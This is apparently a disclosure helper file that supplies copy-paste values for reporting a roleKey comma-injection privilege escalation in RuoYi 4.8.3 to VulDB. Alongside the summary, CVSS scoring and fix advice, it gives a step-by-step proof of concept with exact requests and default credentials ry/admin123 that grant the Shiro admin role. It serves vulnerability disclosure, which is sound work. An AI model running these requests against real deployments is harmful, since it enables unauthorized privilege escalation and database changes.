# VulDB Web Form Copy-Paste (roleKey privilege escalation)

Use this file for the **roleKey comma-injection / Shiro admin-role minting** issue only.

VulDB does not require two uploaded files. The form still treats the vulnerability write-up and the exploit/PoC as different content. Paste the blocks below into the matching fields, then keep this GitHub repository as the public source.

Policy reference: <https://vuldb.com/kb/submission>

Required by VulDB: vendor name, product name, affected versions, and vulnerability class.

Submit URL after login: <https://vuldb.com/?submit>

English is required. VulDB and CVE records are English. Do not paste the Chinese `REPORT.md` into the form.

## Suggested field values

Vendor:

```text
yangzongzhuan
```

If the form autocomplete only offers the older CPE vendor, use:

```text
y_project
```

Recent VulDB RuoYi CVE entries (for example CVE-2025-8847) use `yangzongzhuan`. Older entries use `y_project`. Prefer the autocomplete match that already exists in VulDB.

Product:

```text
RuoYi
```

Affected version:

```text
4.8.3
```

If there is a "version affected up to" field and you have not proven older releases, keep it as `4.8.3` only. Do not write `<=4.8.3` unless you tested those versions.

Vulnerability class / type:

```text
Privilege Escalation
```

If the dropdown has no exact match, choose `Improper Authorization` / `Incorrect Authorization`. Put `CWE-863` in the CWE field. Do **not** choose XSS, CSRF, SQL Injection, or RCE.

CWE:

```text
CWE-863
```

Title:

```text
RuoYi 4.8.3 authDataScope roleKey privilege escalation
```

Affected file / component:

```text
SysRoleController.authDataScopeSave / SysRoleServiceImpl.selectRoleKeys / UserRealm
```

Affected argument / parameter:

```text
roleKey
```

Request CVE:

```text
Yes
```

Only request a CVE if no other CNA is already handling this exact RuoYi root cause (`roleKey` comma split minting Shiro `admin`). Do not attach this to CVE-2024-57438, CVE-2025-56396, CVE-2026-37669, issue 300, or issue 205.

Embargo:

```text
No
```

The Chinese report is already public in this repository. Leave embargo off.

## Summary field

```text
RuoYi 4.8.3 (commit 7995a83e04e1a88aaea5a8a7c50570dffcb145e0) has a privilege-escalation issue in role-key handling. POST /system/role/authDataScope lets an authenticated user with system:role:edit persist roleKey=common,admin on ordinary role ID 2. checkRoleAllowed only rejects roleId==1. Uniqueness compares the full string, so existing key admin does not block common,admin.

On the next login, selectRoleKeys splits roleKey on commas and UserRealm hands the tokens to Shiro. The caller then has the admin Shiro role without being bound to role ID 1 and without receiving *:*:* wildcard permissions.

A local Docker test with the bundled ry/admin123 account was denied on POST /tool/gen/createTable before the mutation (HTTP 200 HTML title RuoYi - 403). After the mutation and a fresh login, the same CREATE TABLE request returned {"msg":"操作成功","code":0}, created table cve_rolekey_poc_7995, and wrote gen_table metadata create_by=ry.

This is distinct from CVE-2024-57438 (user-role ID assignment), CVE-2025-56396 (department data scope), CVE-2026-37669 / issue 328 (deptIds/userIds mapping), issue 300 (createTable SQL filter bypass), and issue 205 (generator RCE). Proven impact is unauthorized CREATE TABLE plus generator metadata write, not arbitrary SQL or RCE.

Advisory: https://github.com/Bob-wentao/security-report-for-ruoyi-role-key-authorization/blob/main/security-report-ruoyi-4.8.3-role-key-authorization.md
```

## Exploit / PoC field

Do not paste the full advisory here. Paste only the reproduction sequence.

Short version if the field is small:

```text
Authorized lab only.

Prerequisite: RuoYi 4.8.3 commit 7995a83e04e1a88aaea5a8a7c50570dffcb145e0. Default SQL user ry/admin123 (role 2 common, permission system:role:edit).

1. Login as ry. Confirm sys_role.role_id=2 role_key=common.
2. POST /tool/gen/createTable sql=CREATE TABLE cve_rolekey_control_7995 (id INT PRIMARY KEY)
   Observed: HTTP 200, title RuoYi - 403, table count 0.
3. POST /system/role/authDataScope roleId=2&roleKey=common,admin&dataScope=2&deptIds=100&deptIds=101&deptIds=105
   Observed: {"msg":"操作成功","code":0} and role_key becomes common,admin.
4. New login as ry. Do not reuse the old session.
5. POST /tool/gen/createTable sql=CREATE TABLE cve_rolekey_poc_7995 (id INT PRIMARY KEY)
   Observed: {"msg":"操作成功","code":0}; table exists; gen_table row create_by=ry.

Control: same createTable request before step 3 is denied.

Full advisory: https://github.com/Bob-wentao/security-report-for-ruoyi-role-key-authorization/blob/main/security-report-ruoyi-4.8.3-role-key-authorization.md
PoC script: https://github.com/Bob-wentao/security-report-for-ruoyi-role-key-authorization/blob/main/ruoyi-role-key-poc.sh
```

## External source / advisory URL

```text
https://github.com/Bob-wentao/security-report-for-ruoyi-role-key-authorization/blob/main/security-report-ruoyi-4.8.3-role-key-authorization.md
```

If the form also asks for repository URL:

```text
https://github.com/Bob-wentao/security-report-for-ruoyi-role-key-authorization
```

Software link:

```text
https://github.com/yangzongzhuan/RuoYi/commit/7995a83e04e1a88aaea5a8a7c50570dffcb145e0
```

## Countermeasure field

```text
Do not split an editable roleKey string into Shiro roles without a reserved-name check. Reject commas, or store roles as a structured set. Server-side reject reserved tokens such as admin on ordinary roles. Enforce uniqueness on the tokens used for authorization, not only on the raw full string. Keep roleId==1 and data-scope checks as separate controls. Add a regression test that roleKey=common,admin must not persist and must not pass @RequiresRoles("admin") after login.
```

## Other optional fields

| Field | Suggested value |
| --- | --- |
| Software homepage | `https://github.com/yangzongzhuan/RuoYi` |
| Software type | Project Management Software / Web Application |
| Remote | Yes |
| Authentication required | Yes (low-privilege account with `system:role:edit`; default `ry` / role `common`) |
| User interaction | No |
| Privileges required | Low |
| CVSS 3.1 vector | `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` |
| Suggested score | `6.5` |
| CVSS note | Integrity High is the unauthorized application-database DDL write. Confidentiality and availability were not proven. Do not score this as unauthenticated and do not add RCE. |
| Discovery / credit | Bob-wentao |
| Public exploit | Proof-of-Concept |
| Vendor contact | GitHub repo `yangzongzhuan/RuoYi` has no `SECURITY.md`. This advisory is already public. State that in the comment if a vendor-contact box exists. |

## Do not fill it this way

- Do not submit this as SQL Injection, XSS, CSRF, file upload, or "unauthenticated RCE".
- Do not claim `*:*:*` wildcard permissions, arbitrary SQL, or command execution.
- Do not mark this as a duplicate of CVE-2024-57438, CVE-2025-56396, CVE-2026-37669, issue 300, or issue 205.
- Do not write affected versions as all historical RuoYi releases unless you tested them.
- Do not paste the Chinese `REPORT.md` into the English form fields.
- Do not set embargo; the Chinese report is already public.
